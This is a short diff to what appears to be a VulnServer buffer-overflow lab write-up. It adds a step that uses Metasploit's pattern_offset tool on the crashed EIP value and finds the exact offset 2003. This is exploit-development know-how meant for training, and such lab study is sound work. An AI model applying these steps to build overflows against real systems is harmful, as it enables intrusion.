@@ -27,3 +27,11 @@ else:
 
 In Immunity debugger we can see the EIP to be 386F4337
 ![image](https://github.com/hac01/VulnServer/assets/70646122/ff03a23f-7406-41ca-875e-9cb5bc5f64e8)
+
+Then we can find the exact offset using pattern_offset
+```sh
+└─$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 386F4337
+[*] Exact match at offset 2003
+```
+
+
